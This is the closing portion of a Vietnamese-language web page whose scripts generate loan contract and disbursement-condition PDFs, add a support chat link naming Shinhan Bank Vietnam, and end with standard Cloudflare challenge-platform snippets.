        gtag('event', 'pdf_download', { event_category: 'Download', event_label: 'Contract PDF' });
    }).catch(err => {
        console.error('PDF generation error:', err);
        alert('Lỗi tạo PDF hợp đồng. Vui lòng thử lại.');
        document.getElementById('result').innerHTML = '<div class="notification"><h4>Lỗi</h4><p>Lỗi tạo PDF hợp đồng. Vui lòng liên hệ hỗ trợ.</p></div>';
        document.getElementById('loadingIndicator').style.display = 'none';
    });
}

function downloadDisbursement() {
    document.getElementById('loadingIndicator').style.display = 'block';
    const element = document.getElementById('disbursement');
    html2pdf().from(element).set({
        filename: `DieuKienGiaiNgan_${document.getElementById('disbursementFullName').innerText}_${document.getElementById('disbursementDate').innerText}.pdf`,
        html2canvas: { scale: 2 },
        jsPDF: { unit: 'in', format: 'letter', orientation: 'portrait' }
    }).save().then(() => {
        document.getElementById('loadingIndicator').style.display = 'none';
        // Thêm nút chat hỗ trợ
        document.body.insertAdjacentHTML('beforeend', '<a href="https://m.me/ShinhanBankVietnam" class="messenger-btn">Chat hỗ trợ</a>');
    }).catch(err => {
        console.error('PDF generation error:', err);
        alert('Lỗi tạo PDF điều kiện giải ngân. Vui lòng thử lại.');
        document.getElementById('result').innerHTML = '<div class="notification"><h4>Lỗi</h4><p>Lỗi tạo PDF điều kiện giải ngân. Vui lòng liên hệ hỗ trợ.</p></div>';
        document.getElementById('loadingIndicator').style.display = 'none';
    });
}
</script>
<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'938562ef0853bd30',t:'MTc0NTk5ODc3OC4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9386afb0899d6745',t:'MTc0NjAxMjQwOC4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'939087e9e8036785',t:'MTc0NjExNTYzNi4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9399d2c5abddadd5',t:'MTc0NjIxMzA3NC4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
</body>
</html>
